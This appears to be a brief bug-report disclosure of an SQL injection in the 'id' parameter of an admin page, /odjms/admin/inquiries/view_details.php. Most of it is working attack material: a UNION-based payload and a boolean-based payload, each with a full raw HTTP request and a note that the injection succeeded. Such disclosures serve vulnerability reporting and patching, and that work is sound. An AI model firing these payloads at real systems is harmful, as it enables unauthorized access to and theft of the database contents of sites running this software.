BUG_Author:yohane

Vulnerability File: /odjms/admin/inquiries/view_details.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-1' union all select null,null,null,null,concat(0x66676869,0x515253),null,null-- -

```
GET /odjms/admin/inquiries/view_details.php?id=-1%27%20union%20all%20select%20null,null,null,null,concat(0x66676869,0x515253),null,null--%20- HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fadnbe58h1fq1i9pdtcrr5juc1
Connection: close
```

union query success

![image](https://github.com/yoyoyoyoyohane/bug_report/blob/main/sql1.png)

Payload2:id=1' and 6=6 AND 'x'='x

```
GET /odjms/admin/inquiries/view_details.php?id=1%27%20and%206=6%20AND%20%27x%27=%27x HTTP/1.1
Host: localhost
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fadnbe58h1fq1i9pdtcrr5juc1
Connection: close
```

The page is echoed normally

![image](https://github.com/yoyoyoyoyohane/bug_report/blob/main/sql2.png)
